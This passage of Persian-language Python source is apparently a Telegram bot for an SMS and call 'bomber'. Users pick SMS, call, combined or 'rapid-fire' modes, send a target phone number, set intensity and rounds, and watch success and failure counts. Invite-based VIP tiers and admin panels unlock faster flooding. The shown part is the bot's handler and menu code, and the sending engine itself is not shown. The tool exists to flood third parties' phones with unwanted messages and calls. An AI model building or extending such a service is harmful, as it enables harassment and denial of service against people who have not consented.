            "اول توی کانالمون عضو شو، بعد دکمه‌ی <b>عضو شدم</b> رو بزن.",
            reply_markup=kb_join(cfg.get("force_join_link", "")),
            disable_web_page_preview=True,
        )
        await state.set_state(S.join)
        return

    is_vip = database.is_vip(m.from_user.id)
    invites = database.invite_count(m.from_user.id)
    need = max(0, VIP_REQUIRED - invites)

    if is_vip:
        welcome = (
            f"سلام <b>{m.from_user.first_name}</b> 👋\n\n"
            f"خوش برگشتی! 💎\n\n"
            f"حسابت VIP هست و همه‌چی برات بازه.\n\n"
            f"از منوی زیر انتخاب کن:"
        )
    else:
        welcome = f"سلام <b>{m.from_user.first_name}</b> 👋\n\nخوش اومدی!\n\n"
        if need == 0:
            welcome += "✨ واجد شرایط VIP شدی! برو توی پنل VIP فعالش کن.\n\n"
        else:
            welcome += f"🎁 دعوت‌هات: <b>{invites}/{VIP_REQUIRED}</b>\n"
            welcome += f"💎 <b>{need}</b> دعوت دیگه تا VIP.\n\n"
        welcome += "از منوی زیر انتخاب کن:"

    await m.answer(welcome, reply_markup=kb_user_menu())
    await state.set_state(S.menu)


@router.message(Command("help"))
async def cmd_help(m: Message):
    is_admin = m.from_user.id in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await m.answer(
        "<b>راهنما</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "چطور کار می‌کنه؟\n\n"
        "1️⃣ یه حالت انتخاب کن (پیامک، تماس، ترکیبی یا رگباری)\n"
        "2️⃣ شماره‌ی هدف رو بفرست\n"
        "3️⃣ اگه رگباری بود، شدت رو انتخاب کن\n"
        "4️⃣ تعداد راند رو بگو\n"
        "5️⃣ صبر کن تا تموم شه\n\n"
        "هر وقت خواستی، دکمه‌ی <b>توقف</b> رو بزن.",
        reply_markup=kb,
    )


@router.message(Command("myid"))
async def cmd_myid(m: Message):
    await m.answer(f"آیدی عددی:\n<code>{m.from_user.id}</code>")


@router.message(Command("cancel"))
async def cmd_cancel(m: Message, state: FSMContext):
    await state.clear()
    is_admin = m.from_user.id in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await m.answer("لغو شد.", reply_markup=kb)
    await state.set_state(S.menu)


@router.message(Command("admin"))
async def cmd_admin(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        return
    if not database.has_rules(m.from_user.id):
        await m.answer("اول قوانین رو بپذیر. /start رو بزن.")
        return
    await m.answer(
        "<b>پنل ادمین</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "یه گزینه انتخاب کن:",
        reply_markup=kb_admin_panel(),
    )


@router.message(Command("stats"))
async def cmd_stats(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    s = database.stats
    total = s.get('total_success', 0) + s.get('total_failed', 0)
    rate = int((s.get('total_success', 0) / total) * 100) if total else 0
    await m.answer(
        "<b>آمار لحظه‌ای</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"کاربران: <b>{fmt_num(s['total_users'])}</b>\n"
        f"VIP: <b>{s.get('vip_count', 0)}</b>\n"
        f"جاب‌ها: <b>{fmt_num(s['total_jobs'])}</b>\n"
        f"موفق: <b>{fmt_num(s.get('total_success', 0))}</b>\n"
        f"ناموفق: <b>{fmt_num(s.get('total_failed', 0))}</b>\n"
        f"نرخ: <b>{rate}%</b>\n"
        f"فعال: <b>{len(ACTIVE)}</b>",
        reply_markup=kb_admin_panel(),
    )


@router.message(Command("stopall"))
async def cmd_stopall(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    count = len(ACTIVE)
    for runner in list(ACTIVE.values()):
        runner.stop()
    await m.answer(f"همه‌ی جاب‌ها متوقف شدند ({count} جاب).",
                   reply_markup=kb_admin_panel())
    log.warning(f"STOP ALL by {m.from_user.id}")


@router.message(Command("ban"))
async def cmd_ban(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await m.answer("استفاده: <code>/ban USER_ID</code>")
        return
    uid = int(args[1])
    if await database.set_banned(uid, True):
        await m.answer(f"کاربر <code>{uid}</code> بن شد.", reply_markup=kb_admin_panel())
    else:
        await m.answer("کاربر پیدا نشد.")


@router.message(Command("unban"))
async def cmd_unban(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await m.answer("استفاده: <code>/unban USER_ID</code>")
        return
    uid = int(args[1])
    if await database.set_banned(uid, False):
        await m.answer(f"کاربر <code>{uid}</code> آزاد شد.", reply_markup=kb_admin_panel())
    else:
        await m.answer("کاربر پیدا نشد.")


@router.message(Command("vip"))
async def cmd_vip(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await m.answer("استفاده: <code>/vip USER_ID</code>")
        return
    uid = int(args[1])
    if await database.set_vip(uid, True):
        await m.answer(f"کاربر <code>{uid}</code> VIP شد.", reply_markup=kb_admin_panel())
    else:
        await m.answer("کاربر پیدا نشد.")


@router.message(Command("find"))
async def cmd_find(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    args = m.text.split(maxsplit=1)
    if len(args) < 2:
        await m.answer("استفاده: <code>/find QUERY</code>")
        return
    q = args[1].strip().lower()
    results = []
    for u in database.users.values():
        if (q in str(u.get("user_id", "")) or
                q in (u.get("username", "") or "").lower() or
                q in (u.get("first_name", "") or "").lower()):
            results.append(u)
        if len(results) >= 10:
            break
    if not results:
        await m.answer("چیزی پیدا نشد.")
        return
    rows = []
    for u in results:
        icon = "🔴" if u.get("is_banned") else ("💎" if u.get("is_vip") else "🟢")
        rows.append([InlineKeyboardButton(
            text=f"{icon} {u.get('first_name','?')[:15]} | {u['user_id']}",
            callback_data=f"uinfo:{u['user_id']}")])
    rows.append([bp("بازگشت", "ad:panel")])
    await m.answer(
        f"<b>نتایج ({len(results)})</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
    )


# ============================================================
#                    REPLY KEYBOARD HANDLERS
# ============================================================
@router.message(F.text == "📩 بمبر پیامک")
async def rk_sms(m: Message, state: FSMContext):
    await start_mode(m, state, "sms")


@router.message(F.text == "📞 بمبر تماس")
async def rk_call(m: Message, state: FSMContext):
    await start_mode(m, state, "call")


@router.message(F.text == "🔥 بمبر ترکیبی")
async def rk_both(m: Message, state: FSMContext):
    await start_mode(m, state, "both")


@router.message(F.text == "⚡ رگباری")
async def rk_rage(m: Message, state: FSMContext):
    uid = m.from_user.id
    is_admin = uid in ADMIN_IDS
    if not database.has_rules(uid):
        await m.answer("اول قوانین رو بپذیر. /start رو بزن.")
        return
    if not is_admin and not await check_membership(m.bot, uid):
        await m.answer("اول توی کانال عضو شو.")
        return

    if not is_admin:
        is_vip = database.is_vip(uid)
        rate_limit = RATE_LIMIT_VIP if is_vip else RATE_LIMIT
        wait = rate_limit - (time.time() - LAST_JOB.get(uid, 0))
        if wait > 0:
            await m.answer(f"یه کم صبر کن. {int(wait)} ثانیه دیگه.")
            return

    note = ""
    if is_admin:
        note = "👑 حالت ادمین — بدون محدودیت\n\n"
    elif database.is_vip(uid):
        note = "💎 حالت VIP — سرعت بالاتر\n\n"

    await m.answer(
        "<b>حالت رگباری</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{note}"
        "شدت رو انتخاب کن:\n\n"
        "🟢 <b>نرمال</b> — سرعت معمولی، امن\n"
        "🟡 <b>سنگین</b> — سرعت بالا\n"
        "🔴 <b>رگباری</b> — حداکثر قدرت\n\n"
        "توجه: حالت رگباری ممکنه شماره رو موقتاً بلاک کنه.",
        reply_markup=kb_intensity(),
    )
    await state.set_state(S.intensity)


async def start_mode(m: Message, state: FSMContext, mode: str):
    uid = m.from_user.id
    is_admin = uid in ADMIN_IDS
    if not database.has_rules(uid):
        await m.answer("اول قوانین رو بپذیر. /start رو بزن.")
        return
    if not is_admin and not await check_membership(m.bot, uid):
        await m.answer("اول توی کانال عضو شو.")
        return

    is_vip = database.is_vip(uid)
    await state.update_data(mode=mode, intensity="normal")

    if not is_admin:
        rate_limit = RATE_LIMIT_VIP if is_vip else RATE_LIMIT
        wait = rate_limit - (time.time() - LAST_JOB.get(uid, 0))
        if wait > 0:
            await m.answer(f"یه کم صبر کن. {int(wait)} ثانیه دیگه.")
            return

    mode_fa = {"sms": "پیامک", "call": "تماس", "both": "ترکیبی"}[mode]
    note = ""
    if is_admin:
        note = "👑 حالت ادمین\n"
    elif is_vip:
        note = "💎 حالت VIP\n"

    await m.answer(
        f"<b>حالت {mode_fa}</b>\n"
        f"{note}\n"
        f"شماره‌ی هدف رو بفرست:\n"
        f"مثال: <code>09123456789</code>",
        reply_markup=kb_cancel(),
    )
    await state.set_state(S.phone)


@router.message(F.text == "📊 آمار من")
async def rk_stats_me(m: Message):
    uid = m.from_user.id
    s = database.user_stats(uid)
    u = database.get(uid) or {}
    joined = u.get("joined_at", "")[:10]
    badges = []
    if uid in ADMIN_IDS: badges.append("👑 ادمین")
    if s['is_vip']: badges.append("💎 VIP")
    badge_str = " | ".join(badges)

    is_admin = uid in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()

    await m.answer(
        "<b>آمار شما</b>\n"
        + (f"{badge_str}\n" if badge_str else "")
        + "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"جاب‌ها: <b>{fmt_num(s['jobs'])}</b>\n"
        f"موفق: <b>{fmt_num(s['success'])}</b>\n"
        f"ناموفق: <b>{fmt_num(s['failed'])}</b>\n"
        f"رگباری: <b>{s['rage']}</b>\n"
        f"دعوت‌ها: <b>{s['invites']}/{VIP_REQUIRED}</b>\n\n"
        f"آیدی: <code>{uid}</code>\n"
        f"عضویت: <b>{joined}</b>",
        reply_markup=kb,
    )


@router.message(F.text == "🌐 آمار کلی")
async def rk_stats_global(m: Message):
    s = database.stats
    total = s.get('total_success', 0) + s.get('total_failed', 0)
    rate = int((s.get('total_success', 0) / total) * 100) if total else 0
    is_admin = m.from_user.id in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()

    await m.answer(
        "<b>آمار کلی</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"کاربران: <b>{fmt_num(s['total_users'])}</b>\n"
        f"VIP: <b>{s.get('vip_count', 0)}</b>\n"
        f"جاب‌ها: <b>{fmt_num(s['total_jobs'])}</b>\n"
        f"موفق: <b>{fmt_num(s.get('total_success', 0))}</b>\n"
        f"ناموفق: <b>{fmt_num(s.get('total_failed', 0))}</b>\n"
        f"نرخ موفقیت: <b>{rate}%</b>\n"
        f"فعال: <b>{len(ACTIVE)}</b>",
        reply_markup=kb,
    )


@router.message(F.text == "📖 راهنما")
async def rk_help(m: Message):
    await cmd_help(m)


@router.message(F.text == "📜 قوانین")
async def rk_rules(m: Message):
    is_admin = m.from_user.id in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await m.answer(RULES_TEXT, reply_markup=kb)


@router.message(F.text == "👑 پنل ادمین")
async def rk_admin(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        return
    if not database.has_rules(m.from_user.id):
        await m.answer("اول قوانین رو بپذیر. /start رو بزن.")
        return
    s = database.stats
    await m.answer(
        "<b>پنل ادمین</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"کاربران: <b>{fmt_num(s['total_users'])}</b>\n"
        f"VIP: <b>{s.get('vip_count', 0)}</b>\n"
        f"جاب‌ها: <b>{fmt_num(s['total_jobs'])}</b>\n"
        f"موفق: <b>{fmt_num(s.get('total_success', 0))}</b>\n"
        f"ناموفق: <b>{fmt_num(s.get('total_failed', 0))}</b>\n"
        f"فعال: <b>{len(ACTIVE)}</b>\n\n"
        "یه گزینه انتخاب کن:",
        reply_markup=kb_admin_panel(),
    )


@router.message(F.text == "📊 آمار لحظه‌ای")
async def rk_live(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    await cmd_stats(m)


@router.message(F.text == "👥 کاربران")
async def rk_users(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    await _users_page_msg(m, 0)


@router.message(F.text == "📦 جاب‌های فعال")
async def rk_active(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    if not ACTIVE:
        await m.answer("جاب فعالی نیست.", reply_markup=kb_admin_panel())
        return
    text = "<b>جاب‌های فعال</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, r in ACTIVE.items():
        pct = int((r.rounds / r.count) * 100) if r.count else 0
        tag = " 👑" if r.is_admin else (" 💎" if r.is_vip else "")
        text += (
            f"<code>{uid}</code>{tag}\n"
            f"شماره: <code>{r.phone}</code>\n"
            f"<code>{progress_bar(pct)}</code> {pct}%\n"
            f"{r.rounds}/{r.count} | ✅{r.success} ❌{r.failed}\n\n"
        )
    await m.answer(text, reply_markup=kb_admin_panel())


@router.message(F.text == "📢 پیام همگانی")
async def rk_broadcast(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        return
    await m.answer(
        "<b>پیام همگانی</b>\n\n"
        "به کی بفرستم؟",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bs("همه کاربران", "bc:all")],
            [bp("فقط VIP", "bc:vip")],
            [bp("فقط فعال‌ها", "bc:active")],
            [bd("لغو", "bc:cancel")],
        ]),
    )


@router.message(F.text == "🎛 تنظیمات")
async def rk_settings(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    await m.answer("<b>تنظیمات ربات</b>", reply_markup=kb_admin_settings())


@router.message(F.text == "❌ لغو عملیات")
async def rk_cancel(m: Message, state: FSMContext):
    await state.clear()
    is_admin = m.from_user.id in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await m.answer("لغو شد.", reply_markup=kb)
    await state.set_state(S.menu)


# ============================================================
#                    VIP PANEL
# ============================================================
@router.message(F.text == "💎 پنل VIP")
async def menu_vip(m: Message):
    uid = m.from_user.id
    if uid in ADMIN_IDS:
        await m.answer(
            "<b>پنل VIP</b>\n\n"
            "👑 تو ادمینی — همه‌ی امکانات VIP برات بازه.\n\n"
            "مزایا:\n"
            "• سرعت 2x\n"
            "• رگباری رایگان\n"
            "• بدون محدودیت",
            reply_markup=kb_admin_menu(),
        )
        return

    is_vip = database.is_vip(uid)
    invites = database.invite_count(uid)
    need = max(0, VIP_REQUIRED - invites)
    eligible = (need == 0)

    if is_vip:
        text = (
            "<b>پنل VIP</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎉 تو VIP هستی!\n\n"
            "مزایا:\n"
            "• سرعت 1.5x\n"
            "• رگباری رایگان\n"
            "• محدودیت کمتر\n"
            "• اولویت در صف\n\n"
            f"دعوت‌هات: <b>{invites}</b>"
        )
    else:
        bar = progress_bar(int(invites * 100 / VIP_REQUIRED) if VIP_REQUIRED else 0)
        text = (
            "<b>پنل VIP</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "هنوز VIP نیستی.\n\n"
            f"برای VIP شدن، <b>{VIP_REQUIRED} دعوت موفق</b> لازم داری.\n\n"
            f"<code>{bar}</code> {invites}/{VIP_REQUIRED}\n"
            f"باقی‌مونده: <b>{need}</b>\n\n"
            "مزایا:\n"
            "• سرعت 1.5x\n"
            "• رگباری رایگان\n"
            "• محدودیت کمتر"
        )

    rows = []
    if is_vip:
        rows.append([bp("لینک دعوت من", "vip_my_link")])
        rows.append([bp("لیست دعوت‌شده‌ها", "vip_list")])
    else:
        rows.append([bp("گرفتن لینک دعوت", "vip_my_link")])
        rows.append([bp("پیشرفت من", "vip_progress")])
        if eligible:
            rows.append([bs("فعال‌سازی VIP", "vip_activate")])
    rows.append([bd("بازگشت", "back_menu")])

    await m.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@router.message(F.text == "🎁 دعوت دوستان")
async def menu_invite(m: Message):
    uid = m.from_user.id
    me = await m.bot.get_me()
    link = get_bot_link(me.username, uid)
    invites = database.invite_count(uid)
    await m.answer(
        "<b>دعوت دوستان</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"دعوت‌های موفق: <b>{invites}/{VIP_REQUIRED}</b>\n\n"
        f"لینک اختصاصی تو:\n"
        f"<code>{link}</code>\n\n"
        f"هر کسی با این لینک بیاد و ربات رو استارت کنه، یه امتیاز می‌گیری.\n"
        f"با <b>{VIP_REQUIRED} دعوت</b>، VIP رایگان می‌شی!\n\n"
        f"نکته: فقط کاربران جدید حساب می‌شن.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bp("اشتراک‌گذاری", url=f"https://t.me/share/url?url={link}&text=B2 ربات")],
            [bp("آمار دعوت", "vip_progress")],
            [bd("بازگشت", "back_menu")],
        ]),
    )


# ============================================================
#                    CALLBACKS — RULES
# ============================================================
@router.callback_query(F.data == "accept_rules")
async def cb_accept(q: CallbackQuery, state: FSMContext):
    await q.answer("ثبت شد")
    await database.accept_rules(q.from_user.id)
    log.info(f"{q.from_user.id} accepted rules")

    is_admin = q.from_user.id in ADMIN_IDS
    if is_admin:
        await q.message.edit_text("ممنون که قوانین رو خوندی ✅")
        await q.message.answer(
            f"خوش اومدی <b>{q.from_user.first_name}</b> 👑\n\n"
            "دسترسی کامل برات فعاله.\n\n"
            "از منوی زیر انتخاب کن:",
            reply_markup=kb_admin_menu(),
        )
        await state.set_state(S.menu)
        return

    if not await check_membership(q.bot, q.from_user.id):
        cfg = database.config
        await q.message.edit_text(
            "<b>یه قدم مونده!</b>\n\nاول توی کانال عضو شو:",
            reply_markup=kb_join(cfg.get("force_join_link", "")),
            disable_web_page_preview=True,
        )
        await state.set_state(S.join)
        return

    await q.message.edit_text("ثبت‌نامت تمومه ✅")
    await q.message.answer(
        f"خوش اومدی <b>{q.from_user.first_name}</b> 👋\n\n"
        "از منوی زیر انتخاب کن:",
        reply_markup=kb_user_menu(),
    )
    await state.set_state(S.menu)


@router.callback_query(F.data == "reject_rules")
async def cb_reject(q: CallbackQuery, state: FSMContext):
    await q.answer("باشه")
    await q.message.edit_text(
        "قوانین رو نپذیرفتی.\n\n"
        "برای استفاده از ربات، باید قوانین رو قبول کنی.\n\n"
        "هر وقت نظرت عوض شد، /start رو بزن."
    )
    await state.clear()


@router.callback_query(F.data == "check_join")
async def cb_check_join(q: CallbackQuery, state: FSMContext):
    ok = await check_membership(q.bot, q.from_user.id)
    if not ok:
        await q.answer("هنوز عضو نشدی!", show_alert=True)
        return
    await q.answer("تایید شد")
    await q.message.edit_text("عضویتت تایید شد ✅")
    await q.message.answer("از منوی زیر انتخاب کن:", reply_markup=kb_user_menu())
    await state.set_state(S.menu)


@router.callback_query(F.data == "back_menu")
async def cb_back(q: CallbackQuery, state: FSMContext):
    await q.answer()
    is_admin = q.from_user.id in ADMIN_IDS
    if not is_admin and not await check_membership(q.bot, q.from_user.id):
        cfg = database.config
        await q.message.edit_text(
            "اول توی کانال عضو شو:",
            reply_markup=kb_join(cfg.get("force_join_link", "")),
            disable_web_page_preview=True,
        )
        await state.set_state(S.join)
        return
    try:
        await q.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await q.message.answer("منو:", reply_markup=kb)
    await state.set_state(S.menu)


# ---------------------- INTENSITY ----------------------
@router.callback_query(F.data.startswith("int:"))
async def cb_intensity(q: CallbackQuery, state: FSMContext):
    choice = q.data.split(":", 1)[1]
    is_admin = q.from_user.id in ADMIN_IDS

    if choice == "cancel":
        await q.answer("لغو")
        await q.message.edit_text("لغو شد.")
        kb = kb_admin_menu() if is_admin else kb_user_menu()
        await q.message.answer("منو:", reply_markup=kb)
        await state.clear()
        await state.set_state(S.menu)
        return

    preset = INTENSITY.get(choice)
    if not preset:
        await q.answer("نامعتبر", show_alert=True)
        return

    await q.answer(f"{preset['emoji']} {preset['label']}")
    await state.update_data(mode="both", intensity=choice)

    is_vip = database.is_vip(q.from_user.id)
    notes = []
    if is_admin: notes.append("👑 ادمین — سرعت 2x")
    elif is_vip: notes.append("💎 VIP — سرعت 1.5x")
    note_str = "\n".join(notes) + "\n\n" if notes else ""

    await q.message.edit_text(
        f"<b>شدت: {preset['label']}</b> {preset['emoji']}\n\n"
        f"{note_str}"
        f"شماره‌ی هدف رو بفرست:"
    )
    await q.message.answer("منتظر شماره‌ام...", reply_markup=kb_cancel())
    await state.set_state(S.phone)


# ---------------------- STOP / STATUS ----------------------
@router.callback_query(F.data.startswith("stop:"))
async def cb_stop(q: CallbackQuery):
    jid = q.data.split(":", 1)[1]
    runner = ACTIVE.get(q.from_user.id)
    if runner and runner.job_id == jid:
        runner.stop()
        await q.answer("درخواست توقف ارسال شد", show_alert=True)
    else:
        await q.answer("جاب فعالی نیست", show_alert=True)


@router.callback_query(F.data.startswith("status:"))
async def cb_status(q: CallbackQuery):
    runner = ACTIVE.get(q.from_user.id)
    if runner:
        pct = int((runner.rounds / runner.count) * 100) if runner.count else 0
        await q.answer(
            f"{runner.rounds}/{runner.count} ({pct}%)\n"
            f"موفق: {runner.success} | ناموفق: {runner.failed}",
            show_alert=True,
        )
    else:
        await q.answer("جاب فعالی نداری", show_alert=True)


# ============================================================
#                    VIP CALLBACKS
# ============================================================
@router.callback_query(F.data == "vip_my_link")
async def cb_vip_link(q: CallbackQuery):
    await q.answer()
    me = await q.bot.get_me()
    link = get_bot_link(me.username, q.from_user.id)
    invites = database.invite_count(q.from_user.id)
    await q.message.edit_text(
        "<b>لینک دعوت تو</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{link}</code>\n\n"
        f"دعوت‌هات: <b>{invites}/{VIP_REQUIRED}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bp("اشتراک‌گذاری", url=f"https://t.me/share/url?url={link}&text=B2 ربات")],
            [bd("بازگشت", "vip_back")],
        ]),
    )


@router.callback_query(F.data == "vip_progress")
async def cb_vip_progress(q: CallbackQuery):
    await q.answer()
    uid = q.from_user.id
    invites = database.invite_count(uid)
    is_vip = database.is_vip(uid)
    need = max(0, VIP_REQUIRED - invites)
    bar = progress_bar(int(invites * 100 / VIP_REQUIRED) if VIP_REQUIRED else 0)
    text = (
        "<b>پیشرفت VIP</b>\n\n"
        f"<code>{bar}</code> {invites}/{VIP_REQUIRED}\n\n"
    )
    if is_vip:
        text += "تو VIP هستی! 💎"
    elif need == 0:
        text += "واجد شرایط شدی! ✨"
    else:
        text += f"{need} دعوت دیگه مونده."

    rows = []
    if not is_vip and need == 0:
        rows.append([bs("فعال‌سازی VIP", "vip_activate")])
    rows.append([bp("لینک دعوت", "vip_my_link")])
    rows.append([bd("بازگشت", "vip_back")])
    await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@router.callback_query(F.data == "vip_activate")
async def cb_vip_activate(q: CallbackQuery):
    uid = q.from_user.id
    if database.is_vip(uid):
        await q.answer("قبلاً VIP شدی", show_alert=True)
        return
    invites = database.invite_count(uid)
    if invites < VIP_REQUIRED:
        await q.answer(f"{VIP_REQUIRED - invites} دعوت کم داری", show_alert=True)
        return
    await database.set_vip(uid, True)
    log.info(f"VIP activated for {uid}")
    await q.answer("VIP فعال شد!", show_alert=True)
    await q.message.edit_text("🎉 تبریک!\n\nالان VIP هستی! 💎")
    await q.message.answer("منو:", reply_markup=kb_user_menu())


@router.callback_query(F.data == "vip_back")
async def cb_vip_back(q: CallbackQuery):
    await q.answer()
    uid = q.from_user.id
    is_vip = database.is_vip(uid)
    invites = database.invite_count(uid)
    need = max(0, VIP_REQUIRED - invites)

    if is_vip:
        text = "<b>پنل VIP</b>\n\nتو VIP هستی! 💎"
        rows = [
            [bp("لینک دعوت", "vip_my_link")],
            [bp("لیست دعوت‌ها", "vip_list")],
            [bd("بازگشت", "back_menu")],
        ]
    else:
        bar = progress_bar(int(invites * 100 / VIP_REQUIRED) if VIP_REQUIRED else 0)
        text = (
            f"<b>پنل VIP</b>\n\n"
            f"<code>{bar}</code> {invites}/{VIP_REQUIRED}\n"
            f"{need} دعوت مونده."
        )
        rows = [
            [bp("لینک دعوت", "vip_my_link")],
            [bp("پیشرفت", "vip_progress")],
        ]
        if need == 0:
            rows.append([bs("فعال‌سازی VIP", "vip_activate")])
        rows.append([bd("بازگشت", "back_menu")])
    await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@router.callback_query(F.data == "vip_list")
async def cb_vip_list(q: CallbackQuery):
    await q.answer()
    u = database.get(q.from_user.id) or {}
    invited = u.get("invited_users", [])
    if not invited:
        await q.message.edit_text(
            "هنوز کسی رو دعوت نکردی.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [bp("لینک دعوت", "vip_my_link")],
                [bd("بازگشت", "vip_back")],
            ]),
        )
        return
    lines = []
    for i, iid in enumerate(invited[:20], 1):
        iu = database.get(iid) or {}
        lines.append(f"{i}. {iu.get('first_name','?')[:15]} — <code>{iid}</code>")
    await q.message.edit_text(
        "<b>دعوت‌شده‌های تو</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bp("لینک دعوت", "vip_my_link")],
            [bd("بازگشت", "vip_back")],
        ]),
    )


# ============================================================
#                    ADMIN CALLBACKS
# ============================================================
@router.callback_query(F.data == "ad:panel")
async def ad_panel(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    s = database.stats
    try:
        await q.message.edit_text(
            "<b>پنل ادمین</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"کاربران: <b>{fmt_num(s['total_users'])}</b>\n"
            f"VIP: <b>{s.get('vip_count', 0)}</b>\n"
            f"جاب‌ها: <b>{fmt_num(s['total_jobs'])}</b>\n"
            f"موفق: <b>{fmt_num(s.get('total_success', 0))}</b>\n"
            f"ناموفق: <b>{fmt_num(s.get('total_failed', 0))}</b>\n"
            f"فعال: <b>{len(ACTIVE)}</b>\n\n"
            "یه گزینه انتخاب کن:",
            reply_markup=kb_admin_panel(),
        )
    except TelegramBadRequest:
        pass


@router.callback_query(F.data == "ad:dashboard")
async def ad_dash(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    s = database.stats
    total = s.get('total_success', 0) + s.get('total_failed', 0)
    rate = int((s.get('total_success', 0) / total) * 100) if total else 0
    today = datetime.now().date().isoformat()
    today_jobs = sum(1 for j in database.jobs.values() if j.get("started_at", "").startswith(today))
    today_users = sum(1 for u in database.users.values() if u.get("joined_at", "").startswith(today))

    try:
        await q.message.edit_text(
            "<b>داشبورد زنده</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"کاربران کل: <b>{fmt_num(s['total_users'])}</b>\n"
            f"امروز: <b>+{today_users}</b>\n\n"
            f"جاب‌ها: <b>{fmt_num(s['total_jobs'])}</b>\n"
            f"امروز: <b>+{today_jobs}</b>\n"
            f"فعال: <b>{len(ACTIVE)}</b>\n\n"
            f"موفق: <b>{fmt_num(s.get('total_success', 0))}</b>\n"
            f"ناموفق: <b>{fmt_num(s.get('total_failed', 0))}</b>\n"
            f"نرخ: <b>{rate}%</b>\n"
            f"<code>{progress_bar(rate)}</code>\n\n"
            f"VIP: <b>{s.get('vip_count', 0)}</b>\n"
            f"بن: <b>{sum(1 for u in database.users.values() if u.get('is_banned'))}</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [bp("بروزرسانی", "ad:dashboard")],
                [bd("بازگشت", "ad:panel")],
            ]),
        )
    except TelegramBadRequest:
        pass


@router.callback_query(F.data == "ad:stats")
async def ad_stats(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    s = database.stats
    total = s.get('total_success', 0) + s.get('total_failed', 0)
    rate = int((s.get('total_success', 0) / total) * 100) if total else 0
    await q.message.edit_text(
        "<b>آمار تفصیلی</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"کاربران: <b>{fmt_num(s['total_users'])}</b>\n"
        f"VIP: <b>{s.get('vip_count', 0)}</b>\n"
        f"جاب‌ها: <b>{fmt_num(s['total_jobs'])}</b>\n"
        f"موفق: <b>{fmt_num(s.get('total_success', 0))}</b>\n"
        f"ناموفق: <b>{fmt_num(s.get('total_failed', 0))}</b>\n"
        f"نرخ: <b>{rate}%</b>\n\n"
        f"مسدود: <b>{s.get('blocked_attempts', 0)}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bd("بازگشت", "ad:panel")],
        ]),
    )


@router.callback_query(F.data == "ad:users")
async def ad_users(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await _users_page(q, 0)


async def _users_page(q: CallbackQuery, page: int):
    users = list(database.users.values())
    users.sort(key=lambda u: u.get("joined_at", ""), reverse=True)
    per_page = 8
    total_pages = max(1, (len(users) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    chunk = users[start:start + per_page]

    banned = sum(1 for u in users if u.get("is_banned"))
    vips = sum(1 for u in users if u.get("is_vip"))
    text = (
        f"<b>کاربران ({fmt_num(len(users))})</b>\n"
        f"مسدود: {banned} | VIP: {vips}\n"
        f"صفحه {page+1}/{total_pages}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    rows = []
    for u in chunk:
        icon = "🔴" if u.get("is_banned") else ("💎" if u.get("is_vip") else "🟢")
        rows.append([InlineKeyboardButton(
